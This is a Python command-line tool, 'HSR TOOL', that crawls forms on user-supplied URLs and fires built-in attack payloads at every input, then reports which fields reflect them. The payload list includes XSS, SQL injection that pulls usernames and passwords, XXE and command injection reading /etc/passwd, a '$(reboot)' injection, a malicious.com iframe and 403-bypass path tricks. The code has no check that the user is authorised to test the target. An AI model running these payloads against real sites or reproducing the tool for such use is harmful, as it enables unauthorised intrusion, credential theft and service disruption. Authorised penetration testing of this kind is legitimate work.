import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import datetime

# Initialize colorama
init(autoreset=True)

def display_logo():
    """Display the HSR TOOL logo."""
    print(Fore.CYAN + """
 .----------------.  .----------------.  .----------------.                      .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. |                    | .--------------. || .--------------. || .--------------. || .--------------. |
| |  ____  ____  | || |    _______   | || |  _______     | |                    | |  _________   | || |     ____     | || |     ____     | || |   _____      | |
| | |_   ||   _| | || |   /  ___  |  | || | |_   __ \    | |                    | | |  _   _  |  | || |   .'    `.   | || |   .'    `.   | || |  |_   _|     | |
| |   | |__| |   | || |  |  (__ \_|  | || |   | |__) |   | |                    | | |_/ | | \_|  | || |  /  .--.  \  | || |  /  .--.  \  | || |    | |       | |
| |   |  __  |   | || |   '.___`-.   | || |   |  __ /    | |                    | |     | |      | || |  | |    | |  | || |  | |    | |  | || |    | |   _   | |
| |  _| |  | |_  | || |  |`\____) |  | || |  _| |  \ \_  | |                    | |    _| |_     | || |  \  `--'  /  | || |  \  `--'  /  | || |   _| |__/ |  | |
| | |____||____| | || |  |_______.'  | || | |____| |___| | |                    | |   |_____|    | || |   `.____.'   | || |   `.____.'   | || |  |________|  | |
| |              | || |              | || |              | |                    | |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |                    | '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'                      '----------------'  '----------------'  '----------------'  '----------------' 
  
    """ + Style.RESET_ALL)
    print(Fore.CYAN + "       Unified Vulnerability Scanner By (HSR TOOL) this tool is made by HARSH SINGH RAO\n" + Style.RESET_ALL)

def generate_payloads(attack_type):
    """Generate payloads for specific attack types."""
    payloads = {
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>"
        ],
        "sql": [
            "' OR '1'='1", 
            "' UNION SELECT NULL, username, password FROM users --", 
            """' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT DATABASE()), 0x7e, FLOOR(RAND(0)*2)) AS a FROM INFORMATION_SCHEMA.TABLES GROUP BY a) x) --"""
        ],
        "xml": [
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
            "<data>&entity;</data>",
            "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" /></root>"
        ],
        "osi": [
            "| ls",
            "; cat /etc/passwd",
            "$(reboot)"
        ],
        "html": [
            "<b>Test</b>",
            "<iframe src=\"http://malicious.com\"></iframe>",
            "<input type='text' value='Test'>"
        ],
        "403": [
            "..;/", 
            "%2e%2e/", 
            "%2e%2e%2f%2e%2e"
        ]
    }
    return payloads.get(attack_type, [])

def load_payloads_from_file(file_path):
    """Load payloads from a file."""
    try:
        with open(file_path, "r") as file:
            payloads = [line.strip() for line in file if line.strip()]
        if not payloads:
            print(Fore.RED + "The payload file is empty.")
        return payloads
    except FileNotFoundError:
        print(Fore.RED + f"Error: File {file_path} not found.")
        return []

def scan_website(target_url, payloads, attack_type, report_data):
    """Scan a website for vulnerabilities using payloads."""
    print(Fore.YELLOW + f"Scanning website: {target_url}\n")
    try:
        response = requests.get(target_url)
        if response.status_code != 200:
            print(Fore.RED + "Unable to access the website. Exiting.")
            return

        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            print(Fore.RED + "No forms found on the website. Exiting.")
            return

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")

            form_data = {}
            for input_tag in inputs:
                name = input_tag.get("name")
                if name:
                    form_data[name] = "test"  # Default test value

            target_action = target_url + action if action else target_url

            for payload in payloads:
                for key in form_data.keys():
                    form_data[key] = payload
                    if method == "post":
                        vuln_response = requests.post(target_action, data=form_data)
                    else:
                        vuln_response = requests.get(target_action, params=form_data)

                    if payload in vuln_response.text:
                        message = f"[VULNERABILITY] {key} is vulnerable with payload: {payload}"
                        print(Fore.GREEN + message)
                        report_data.append((target_url, attack_type, key, payload, "Vulnerable"))
                    else:
                        message = f"[SAFE] {key} with payload: {payload}"
                        print(Fore.RED + message)
                        report_data.append((target_url, attack_type, key, payload, "Safe"))

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error scanning the website: {e}")

def load_urls_from_file(file_path):
    """Load URLs from a file."""
    try:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
        if not urls:
            print(Fore.RED + "The URL file is empty.")
        return urls
    except FileNotFoundError:
        print(Fore.RED + f"Error: File {file_path} not found.")
        return []

def generate_report(report_data):
    """Generate a report of the scan results."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_filename = f"scan_report_{timestamp}.txt"
    with open(report_filename, "w") as report_file:
        report_file.write("HSR Tool Vulnerability Scan Report\n")
        report_file.write(f"Generated on: {datetime.datetime.now()}\n\n")
        report_file.write("Target URL | Attack Type | Input Field | Payload | Result\n")
        report_file.write("-" * 80 + "\n")
        for entry in report_data:
            report_file.write(" | ".join(entry) + "\n")
    print(Fore.CYAN + f"Report saved as {report_filename}")

def main():
    display_logo()

    print("1. Enter a single URL")
    print("2. Load URLs from a file")
    choice = input("Select an option (1/2): ").strip()

    urls = []
    if choice == "1":
        target_url = input("Enter target URL: ").strip()
        urls.append(target_url)
    elif choice == "2":
        url_file = input("Enter the path to the URL file: ").strip()
        urls = load_urls_from_file(url_file)
    else:
        print(Fore.RED + "Invalid choice. Exiting.")
        return

    if not urls:
        print(Fore.RED + "No URLs to scan. Exiting.")
        return

    print("Select attack type:")
    print("1. XSS")
    print("2. SQL Injection")
    print("3. XML Injection")
    print("4. OSI Injection")
    print("5. HTML Injection")
    print("6. 403 Bypass")
    attack_choice = input("Enter attack type (1/2/3/4/5/6): ").strip()

    attack_types = {
        "1": "xss",
        "2": "sql",
        "3": "xml",
        "4": "osi",
        "5": "html",
        "6": "403"
    }

    attack_type = attack_types.get(attack_choice)
    if not attack_type:
        print(Fore.RED + "Invalid attack type. Exiting.")
        return

    print("Select payload option:")
    print("1. Use default payloads")
    print("2. Load payloads from a file")
    payload_choice = input("Enter payload option (1/2): ").strip()

    if payload_choice == "1":
        payloads = generate_payloads(attack_type)
    elif payload_choice == "2":
        payload_file = input("Enter the path to the payload file: ").strip()
        payloads = load_payloads_from_file(payload_file)
    else:
        print(Fore.RED + "Invalid payload option. Exiting.")
        return

    report_data = []

    for url in urls:
        scan_website(url, payloads, attack_type, report_data)

    generate_report(report_data)

if __name__ == "__main__":
    main()
